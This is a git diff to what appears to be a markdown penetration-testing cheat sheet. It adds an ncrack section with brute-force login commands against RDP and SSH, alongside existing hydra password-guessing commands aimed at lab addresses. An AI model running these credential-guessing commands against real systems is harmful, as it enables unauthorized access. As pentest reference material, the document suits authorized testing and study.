@@ -7,7 +7,8 @@
 * [hydra](#hydra)
   * [http-get](#http-get)
   * [http-post-form](#http-post-form)
-  * [ssh](#ssh)   
+  * [ssh](#ssh)
+* [ncrack](#ncrack)
 * [Header Fuzzing and Manipulation](#header-fuzzing-and-manipulation)
   * [Fetch Header](#fetch-header)
   * [wfuzz](#wfuzz)
@@ -101,6 +102,25 @@ hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login
 ### ssh
 ```sh
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.123 -t 4
+```
+## ncrack
+Refs:
+
+* <https://tools.kali.org/password-attacks/ncrack>
+
+* <https://nmap.org/ncrack/man.html>
+
+Use verbose mode (`-v`), read a list of IP addresses (`-iL` win.txt), and attempt to login with the username victim (`–user` victim) along with the passwords in a dictionary (`-P` passes.txt) using the RDP protocol (`-p` rdp) with a one connection at a time (`CL=1`):
+```
+root@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1
+```
+### ssh
+```
+ncrack -v  -U username -P passwords CL=1 10.10.10.109:22
+OR
+ncrack -v  -U username -P passwords CL=10 ssh://10.10.10.109
+OR
+ncrack -v  -U username -P passwords CL=10 -p ssh 10.10.10.109
 ```
 # Header Fuzzing and Manipulation
 ## Fetch Header
